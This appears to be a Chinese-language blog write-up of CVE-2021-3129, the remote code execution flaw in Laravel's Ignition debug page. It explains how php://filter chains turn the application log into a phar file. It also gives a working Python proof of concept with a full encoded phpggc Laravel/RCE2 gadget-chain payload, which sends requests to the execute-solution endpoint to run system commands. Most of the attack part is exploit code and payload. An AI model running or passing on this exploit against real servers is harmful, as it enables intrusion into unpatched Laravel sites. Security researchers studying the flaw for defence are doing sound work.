&#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(asdfasdfasdfasdf): failed to open stream: No such file or directory at /var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:78)[stacktrace]#0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-&gt;handleError(2, &#x27;file_get_conten...&#x27;, &#x27;/var/www/vendor...&#x27;, 78, Array)#1 /var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(78): file_get_contents(&#x27;asdfasdfasdfasd...&#x27;)\n\nasdfasdfasdf 是我輸入的，可以發現會有三個地方有 asdfasdfasdf\n\n1[log content]payload[log content]payload[log content]\n\n\n為什麼只有兩個 payload 是因為第三個地方會因為太長的關係被卡掉\n\n\n至於 log content 分別是 6928 112 6634，可以簡化成雙數\n1[logs]payloads[logs]payloads[logs]\n\n至於第一個 logs 是特別的，自己測試的時候發現如果直接送 payload 的話，第一個 logs 的地方會是奇數 53，所以為了達成 logs 要是雙數的目標會先送一組無害的而且要是雙數的 payload，這樣第一個 logs 就會是雙數啦\n\n\n\n還有一件事，payload 會是雙數，所以上面才會是 payloads\n\n\n要把 log content 相關的內容透過 php filter 轉換掉\n\n\nhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html\n\n大概說如果用 php://filter/write=convert.base64-decode 會把不符合 base64 應該有的字元都處理掉，所以說還要搭配其他的 filter 把 log 的文字弄成不是 base64 應該有的字元，並且可以保留 payload\nhttps://www.php.net/manual/zh/filters.convert.php\n\n\n\n1234567&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.iconv.utf-16le.utf-8&#x27;);fwrite($fp, &quot;[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0[logs]&quot;);fclose($fp);/* 输出：汛杯嵳payloads汛杯嵳payloads汛杯嵳 */?&gt;\n\n需要注意一件事情，filter 吃的字串要是偶數，如果是奇數會報錯，所以說在送 payload 的時候要讓整個文件是偶數的，這個時候可以送兩次讓裡面的內容是平衡的就可以避免掉下面的錯誤\n\n1Warning: fclose(): iconv stream filter (&quot;utf-16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence\n\n可以注意到會有兩個 payloads，之後我自己在測試的時候發現如果生成兩個 phar 的 payload\n\n123&lt;?php __HALT_COMPILER(); ?&gt;xxxO:40:&quot;...&quot;&#123;&#125;xxx&lt;?php __HALT_COMPILER(); ?&gt;xxxO:40:&quot;...&quot;&#123;&#125;xxx\n\n會是沒辦法 RCE 的\n如果在 payload 後面加上一個字元可以發現只會生成一個 payload\n\n1234567&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.iconv.utf-16le.utf-8&#x27;);fwrite($fp, &quot;[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0a[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0a[logs]&quot;);fclose($fp);/* 输出：汛杯嵳payloads孡潬獧灝愀礀氀漀愀搀猀愀汛杯嵳 */?&gt;\n\n因為 payload 裡面包含空字元，file_get_contents 會報錯\n\n1Warning: file_get_contents() expects parameter 1 to be a valid path, string given in \n\n搭配 convert.quoted-printable-encode 可以把 =00 轉成 \\0 這樣 payload 裡面的空字元就可以用了 file_get_contents 在讀取得時候也不會有錯誤\n\n123456&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.quoted-printable-encode&#x27;);fwrite($fp, &quot;This is a test.\\n\\0&quot;);/* 输出： This is a test.=0A=00  */?&gt;\n\n\n把上面的 filter 組合起來\n1php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log\n\n如果要清空可以用上面原作者給的方法也可以再送一次這個組合的 filter，照著上面的原理也是可以把檔案內容清空的\n\n\n\n到這邊基本上已經可以組出一個完整的攻擊了\n\n\n用 phpggc 選一個 gadget chain，我自己是選擇 Laravel/RCE2\n\nhttps://github.com/ambionics/phpggc\n\n\n\n1php -d &#x27;phar.readonly=0&#x27; ./phpggc -p phar -o /var/www/storage/logs/laravel.log Laravel/RCE2 system id\n\n可以用這個 command 測試一下自己選的 gadget chain 能不能跑\n下面是我最後的 poc\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import requestsimport reurl = &quot;http://0.0.0.0:8787/_ignition/execute-solution&quot;# 清掉 logdef clearLog():    for _ in range(3):        requests.post(url, json=&#123;            &quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,            &quot;parameters&quot;:&#123;                &quot;variableName&quot;:&quot;test&quot;,                &quot;viewFile&quot;:&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log&quot;            &#125;        &#125;)def exploit():\t# 正常的 error log，主要目的是平衡 log 裡面的字數，要是偶數    requests.post(url, json=&#123;        &quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,        &quot;parameters&quot;:&#123;            &quot;variableName&quot;:&quot;test&quot;,            &quot;viewFile&quot;:&quot;ww&quot;        &#125;    &#125;)\t# 下面的指令產出的 payload 轉 base64 之後搭配下面的 php 腳本可以產出最後的攻擊 payload    # php -d &#x27;phar.readonly=0&#x27; ./phpggc -p phar -o z.phar Laravel/RCE2 system id    # cat z.phar | base64    # &lt;?php    # function ascii2hex($ascii) &#123;    #     $hex = &#x27;&#x27;;    #     for ($i = 0; $i &lt; strlen($ascii); $i++) &#123;    #     $byte = strtoupper(dechex(ord($ascii&#123;$i&#125;)));    #     $byte = str_repeat(&#x27;0&#x27;, 2 - strlen($byte)).$byte;    #     $hex.=$byte.&quot;&quot;;    #     &#125;    #     return $hex;    # &#125;    # $ser_payload = &quot;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQr0AAAAAQAAABEAAAABAAAAAAC+AAAATzo0MDoi    # SWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVu    # dHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3Rl    # bmVycyI7YToxOntzOjI6ImlkIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo4OiIAKgBldmVu    # dCI7czoyOiJpZCI7fQgAAAB0ZXN0LnR4dAQAAADIhARkBAAAAAx+f9ikAQAAAAAAAHRlc3RhFVCf    # e6R7j1EiNl54coN/+7RQcAIAAABHQk1C&quot;;    # $convert_ser_payload = &quot;&quot;;    # foreach (str_split($ser_payload) as $char) &#123;    #     $convert_ser_payload .= &quot;=&quot; . ascii2hex($char) . &quot;=00&quot;;    # &#125;    # echo $convert_ser_payload . &quot;\\n&quot;;    # ?&gt;\t# 攻擊 payload    requests.post(url, json=&#123;        &quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,        &quot;parameters&quot;:&#123;            &quot;variableName&quot;:&quot;test&quot;,            &quot;viewFile&quot;:&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=30=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=2B=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=0A=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=0A=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=52=00=58=00=5A=00=6C=00=62=00=6E=00=52=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=49=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=70=00=63=00=33=00=52=00=6C=00=0A=00=62=00=6D=00=56=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=0A=00=64=00=43=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=49=00=68=00=41=00=52=00=6B=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=68=00=46=00=56=00=43=00=66=00=0A=00=65=00=36=00=52=00=37=00=6A=00=31=00=45=00=69=00=4E=00=6C=00=35=00=34=00=63=00=6F=00=4E=00=2F=00=2B=00=37=00=52=00=51=00=63=00=41=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a&quot;        &#125;    &#125;)\t# 把 payload 轉成可以用 phar 協議解析的樣子    requests.post(url, json=&#123;        &quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,        &quot;parameters&quot;:&#123;            &quot;variableName&quot;:&quot;test&quot;,            &quot;viewFile&quot;:&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log&quot;        &#125;    &#125;)\t# 以 phar 協議反序列化裡面的內容    response = requests.post(url, json=&#123;        &quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,        &quot;parameters&quot;:&#123;            &quot;variableName&quot;:&quot;test&quot;,            &quot;viewFile&quot;:&quot;phar:///var/www/storage/logs/laravel.log/a&quot;        &#125;    &#125;)    print(response.text.split(&quot;&lt;/html&gt;&quot;)[1])clearLog()exploit()","plink":"https://entroychang.github.io/2023/03/01/CVE-2021-3129/"}]